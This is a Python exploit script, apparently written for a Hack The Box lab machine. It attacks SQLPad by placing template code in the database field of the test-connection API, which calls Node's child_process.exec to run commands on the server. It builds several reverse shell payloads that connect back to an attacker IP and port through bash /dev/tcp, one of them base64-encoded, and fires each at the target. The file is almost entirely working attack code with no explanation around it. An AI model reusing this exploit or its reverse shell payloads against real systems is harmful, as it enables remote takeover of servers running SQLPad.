import sys
import requests
import argparse
import json
import base64
# parser = argparse.ArgumentParser()
# parser.add_argument('--url', help='URL of the SQLPad application - http(s)://<IP>:<PORT>', required=True)
# parser.add_argument('--command', help='Command to execute', required=True)
# parser.add_argument('--username', help='Username')
# parser.add_argument('--password', help='Password')
# args = parser.parse_args()


attacker_ip = "10.10.14.164"
attacker_port = 4444
url = "http://sqlpad.sightless.htb:80"


cookie = ''


def get_base64_payload():
    # Crafting reverse shell command. 
  shell = base64.b64encode(f'bash -c \"bash -i >&/dev/tcp/{attacker_ip}/{attacker_port} 0>&1\"'.encode('utf-8'))
  revshell = shell.decode('utf-8')

  return   f'bash -c {{echo,{revshell}}}|{{base64,-d}}|{{bash,-i}}'




def get_payloads():
  return [f"/bin/bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",get_base64_payload(), f"ping {attacker_ip}"]


def exploit(command: str):
  data = {
    "driver":"mysql",
    "data":{
      "database":"{{ process.mainModule.require('child_process').exec('" + command + "') }}"
    },
    "database":"{{ process.mainModule.require('child_process').exec('" + command + "') }}",
    "name":"Test"
  }
  headers = {
    'Content-Type': 'application/json',
    'Cookie': cookie
  }

  json_data = json.dumps(data)
  response = requests.post(url + '/api/test-connection', data=json_data, headers=headers)
  print(response.text)
  if response.status_code == 401:
    print("[-] You need to log in first!")
    exit(1)
  elif response.status_code != 400:
    print("[-] Something went wrong!")
    exit(1)

  print("[*] Exploited!")

# def login():
#   global cookie
#   data = {
#     "email":username,
#     "password":password
#   }

#   json_data = json.dumps(data)

#   response = requests.post(url + '/api/signin', data=json_data, headers={'Content-Type': 'application/json'})

#   if response.status_code == 200:
#     print("[*] Login was successfull")
#     cookie = response.headers['Set-Cookie']
#   else:
#     print("[-] Login - something went wrong!")
#     exit(1)

# if username and password:
#   login()



payloads = get_payloads()

for payload in payloads:
  exploit(payload)
